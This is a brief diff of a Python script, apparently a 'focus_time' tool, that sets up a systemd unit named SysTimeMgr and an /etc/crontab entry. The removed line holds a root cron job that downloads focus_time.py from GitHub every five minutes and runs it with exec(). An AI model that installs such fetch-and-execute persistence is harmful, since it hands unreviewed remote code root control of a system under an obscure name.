@@ -16,7 +16,7 @@ unit_url = "https://raw.githubusercontent.com/Angretlam/focus_time/main/195c4de4
 unit_path = "/etc/systemd/system/SysTimeMgr.service"
 unit_dir = "/etc/systemd/system/"
 crontab = "/etc/crontab"
-one_liner = '0/5 * * * *     root    /usr/bin/python3 -c "import requests; import os; exec(requests.get(\'https://raw.githubusercontent.com/Angretlam/focus_time/main/focus_time.py\').text)"'
+one_liner = 'https://raw.githubusercontent.com/Angretlam/focus_time/main/focus_time.py'
 one_liner_pattern = re.compile(one_liner)
 
 # Functions
